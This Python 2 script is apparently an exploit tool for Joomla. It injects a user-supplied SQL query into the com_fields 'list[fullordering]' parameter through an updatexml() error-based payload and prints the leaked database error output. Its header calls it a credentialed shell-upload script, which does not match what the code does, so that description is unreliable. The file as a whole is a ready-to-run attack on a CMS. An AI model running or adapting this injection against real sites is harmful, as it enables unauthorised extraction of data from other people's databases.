#!/usr/bin/env python
# joomla_shellup.py - small script to upload shell in Joomla
#
# 02.05.2017, rewrited: 27.05
# -- hint --
# To exploit this "feature" you will need valid credentials.'
# Based on latest (3.6.5-1) version.'
#   Tested also on: 3.7.x
import urllib

import requests
import re
import binascii

target = raw_input("[+] Hostname >> ")

# target = "http://192.168.159.132:8000"

print '[+] Checking: ' + str(target)

# initGET
session = requests.session()
flag = raw_input("Input your SQL Injection:")
flag = urllib.quote(flag)
initlink = target + '/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x3a,concat(1,({})),1)'.format(flag)

initsend = requests.get(initlink)
initresp = initsend.text


check = re.compile(r'(?<=syntax error: &#039;).*(?=&#039;)')

if check.search(initresp) is not None:
    print check.search(initresp).group()
else:
    print "Not have SQL Injention"






